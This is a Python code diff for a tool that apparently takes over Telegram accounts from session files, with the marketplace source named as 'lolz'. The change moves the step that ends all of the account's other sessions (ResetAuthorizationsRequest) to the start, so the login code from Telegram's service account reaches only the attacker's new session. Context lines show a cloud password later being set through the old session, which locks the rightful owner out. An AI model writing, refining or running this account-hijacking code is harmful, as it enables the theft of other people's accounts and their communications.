@@ -6223,8 +6223,24 @@ async def _transplant_one(sess: Path) -> bool:
                 await old.disconnect()
                 return False
 
-            # 1. no reset yet: other devices stay alive so the login code has
-            #    a live app session to land in; the kick runs at step 5
+            # 1. KICK FIRST — the proven worker order. With every other
+            #    device gone the App code can only land in this lolz session,
+            #    so 777000 actually delivers it here. Backup is already on
+            #    origin/main and this session itself stays authorized.
+            log.info("transplant %s: kicking other sessions", name)
+            try:
+                await old(ResetAuthorizationsRequest())
+                log.info("transplant %s: other sessions kicked", name)
+            except FloodWaitError as e:
+                log.warning("transplant %s: kick FloodWait %ss", name, e.seconds)
+                await old.disconnect()
+                return False
+            except Exception as e:
+                log.warning("transplant %s: kick failed: %s", name, e)
+                await old.disconnect()
+                return False
+            await asyncio.sleep(2)
+
             # 2. запрашиваем код входа на новой сессии
             new_api_id, new_api_hash = random.choice(_TRANSPLANT_API_PAIRS)
             new_path = TRANSPLANT_OUT / f"{name}_new"
@@ -6355,19 +6371,6 @@ async def _transplant_one(sess: Path) -> bool:
                     pass
                 await old.disconnect()
                 return False
-
-            # 4e. now kick every other session of the account: the new one
-            #     is already on origin/main, so nothing can be lost here
-            log.info("transplant %s: resetting other sessions", name)
-            try:
-                await old(ResetAuthorizationsRequest())
-            except FloodWaitError as e:
-                log.warning("transplant %s: reset FloodWait %ss — other "
-                            "sessions left alive", name, e.seconds)
-            except Exception as e:
-                log.warning("transplant %s: reset failed: %s — other "
-                            "sessions left alive", name, e)
-            await asyncio.sleep(2)
 
             # 5. облачный пароль через старую сессию
             try:
